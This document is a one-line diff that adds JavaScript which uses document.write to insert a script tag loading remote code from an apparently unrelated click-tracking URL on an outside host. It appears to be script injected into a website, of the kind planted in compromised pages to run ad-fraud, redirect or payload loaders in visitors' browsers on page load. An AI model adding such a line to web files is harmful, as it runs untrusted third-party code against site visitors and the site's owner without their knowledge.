@@ -1,0 +1,1 @@
+document.write("<script src='http://j.jiawen88.com/cpc/i7click.php?z=26209'></script>");
